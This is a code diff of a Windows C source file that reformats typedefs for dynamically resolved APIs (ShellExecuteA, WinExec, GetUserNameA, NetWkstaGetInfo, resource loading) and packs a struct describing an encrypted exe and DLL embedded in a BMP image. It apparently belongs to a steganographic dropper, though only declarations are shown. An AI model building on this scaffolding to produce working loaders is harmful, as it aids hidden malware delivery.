@@ -3,32 +3,32 @@
 #include <lm.h>
 #include "winternl.h"  
 
-typedef HINSTANCE (__stdcall *ptrShellExecuteA)( HWND hwnd,  LPCSTR lpOperation,  LPCSTR lpFile,  LPCSTR lpParameters,LPCSTR lpDirectory,INT nShowCmd);
-typedef DWORD (__stdcall *ptrGetProcAddress)(HMODULE,LPSTR);
-typedef HMODULE (__stdcall *ptrLoadLibraryA)(LPSTR);
-typedef  BOOL (WINAPI *ptrGetUserNameA) (LPSTR lpBuffer,LPDWORD pcbBuffer);
-typedef BOOL (WINAPI *ptrGetComputerNameA) (LPSTR lpBuffer,LPDWORD nSize);
-typedef UINT (WINAPI * ptrGetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
-typedef VOID (WINAPI * ptrGetSystemTime)( LPSYSTEMTIME lpSystemTime);
-typedef DWORD (WINAPI * ptrGetTickCount)(VOID);
-typedef NET_API_STATUS (WINAPI * ptrNetWkstaGetInfo) (   LMSTR   servername ,IN  DWORD   level, LPBYTE  *bufptr);
-typedef NET_API_STATUS (WINAPI * ptrNetApiBufferFree) ( LPVOID Buffer);
-typedef HRSRC (WINAPI *ptrFindResourceA)( HMODULE hModule,LPCSTR lpName,LPCSTR lpType);
-typedef DWORD (WINAPI *ptrSizeofResource)( HMODULE hModule, HRSRC hResInfo);
-typedef HGLOBAL (WINAPI *ptrLoadResource)( HMODULE hModule, HRSRC hResInfo);
-typedef LPVOID (WINAPI *ptrLockResource)( HGLOBAL hResData);
-typedef HANDLE (WINAPI *ptrCreateFileA)(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
-typedef BOOL (WINAPI *ptrCloseHandle)( HANDLE hObject);
-typedef BOOL (WINAPI *ptrReadFile)(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped);
-typedef BOOL (WINAPI *ptrWriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
-typedef int (__stdcall *ptrlstrlenA)( __in LPCSTR lpString );
-typedef int (__stdcall *ptrlstrcatA)( __in LPCSTR lpString1 ,LPCSTR lpString2);
-typedef int (__stdcall *ptrlstrcpyA)( __in LPCSTR lpString1 ,LPCSTR lpString2);
-typedef int (WINAPIV *ptrwsprintfA)(LPSTR,LPCSTR,...);
-typedef BOOL (WINAPI *ptrMakeSureDirectoryPathExists)(char*);
-typedef INT (WINAPI*ptrExitProcess)(int code);
-typedef int (WINAPI* ptrWinExec)(char *,int );
-typedef int (WINAPI* ptrSetFileAttributesA)(char *,int);
+typedef HINSTANCE(__stdcall* ptrShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
+typedef DWORD(__stdcall* ptrGetProcAddress)(HMODULE, LPSTR);
+typedef HMODULE(__stdcall* ptrLoadLibraryA)(LPSTR);
+typedef  BOOL(WINAPI* ptrGetUserNameA) (LPSTR lpBuffer, LPDWORD pcbBuffer);
+typedef BOOL(WINAPI* ptrGetComputerNameA) (LPSTR lpBuffer, LPDWORD nSize);
+typedef UINT(WINAPI* ptrGetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
+typedef VOID(WINAPI* ptrGetSystemTime)(LPSYSTEMTIME lpSystemTime);
+typedef DWORD(WINAPI* ptrGetTickCount)(VOID);
+typedef NET_API_STATUS(WINAPI* ptrNetWkstaGetInfo) (LMSTR   servername, IN  DWORD   level, LPBYTE* bufptr);
+typedef NET_API_STATUS(WINAPI* ptrNetApiBufferFree) (LPVOID Buffer);
+typedef HRSRC(WINAPI* ptrFindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
+typedef DWORD(WINAPI* ptrSizeofResource)(HMODULE hModule, HRSRC hResInfo);
+typedef HGLOBAL(WINAPI* ptrLoadResource)(HMODULE hModule, HRSRC hResInfo);
+typedef LPVOID(WINAPI* ptrLockResource)(HGLOBAL hResData);
+typedef HANDLE(WINAPI* ptrCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+typedef BOOL(WINAPI* ptrCloseHandle)(HANDLE hObject);
+typedef BOOL(WINAPI* ptrReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
+typedef BOOL(WINAPI* ptrWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef int(__stdcall* ptrlstrlenA)(__in LPCSTR lpString);
+typedef int(__stdcall* ptrlstrcatA)(__in LPCSTR lpString1, LPCSTR lpString2);
+typedef int(__stdcall* ptrlstrcpyA)(__in LPCSTR lpString1, LPCSTR lpString2);
+typedef int (WINAPIV* ptrwsprintfA)(LPSTR, LPCSTR, ...);
+typedef BOOL(WINAPI* ptrMakeSureDirectoryPathExists)(char*);
+typedef INT(WINAPI* ptrExitProcess)(int code);
+typedef int (WINAPI* ptrWinExec)(char*, int);
+typedef int (WINAPI* ptrSetFileAttributesA)(char*, int);
 
 HMODULE lpDllShell32 = 0;
 HMODULE lpDllKernel32 = 0;
@@ -80,11 +80,12 @@ ptrSetFileAttributesA	lpSetFileAttributesA;
 #define PROGRAM_ICON		0x3000
 
 
-
-typedef struct{
+#pragma pack(1)
+typedef struct {
 	char exefilename[64];
 	int exelen;
 	char dllfilename[64];
 	int dlllen;
 	unsigned char key[16];
-}BMPEMBEDDEDFILEINFO,*LPBMPEMBEDDEDFILEINFO;
+}BMPEMBEDDEDFILEINFO, * LPBMPEMBEDDEDFILEINFO;
+#pragma pack()
